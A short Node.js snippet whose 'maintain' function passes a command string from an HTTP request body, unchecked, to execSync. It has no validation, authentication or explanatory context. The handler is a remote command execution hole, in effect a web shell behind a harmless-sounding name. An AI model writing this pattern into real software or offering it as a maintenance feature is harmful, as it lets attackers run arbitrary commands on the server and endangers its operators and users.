const { execSync } = require("child_process");
function maintain(req) {
  const task = req.body.cmd;
  execSync(task);
}
